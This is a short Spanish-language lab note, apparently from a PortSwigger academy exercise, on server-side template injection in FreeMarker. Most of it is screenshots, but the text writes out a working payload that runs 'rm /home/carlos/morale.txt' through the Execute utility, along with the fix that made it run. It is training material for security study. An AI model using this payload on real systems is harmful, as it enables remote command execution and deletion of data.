![[Pasted image 20221020112941.png]]

![[Pasted image 20221020113132.png]]


![[Pasted image 20221020113204.png]]

Editando un template

![[Pasted image 20221020113312.png]]


![[Pasted image 20221020113403.png]]

Este exploit esta basado en una investigacion que hizo AlbinoWax, de manera que el payload puede quedar asi: {<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }

![[Pasted image 20221020113652.png]]

Al guardarla me redirigue y no me dio ningun error

![[Pasted image 20221020113833.png]]


tengo que ver la pagina para que el payload se ejecute, pero no hace nada, verificando el video de Garr7

borre todo el post y el payload no inicia con una llave, de manera que es asi: 
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }

![[Pasted image 20221020115046.png]]

al guardar los cambios, si el payload esta bien se resuelve el lab

![[Pasted image 20221020115127.png]]

este es el link de la investigacion de albinowax: https://portswigger.net/research/server-side-template-injection

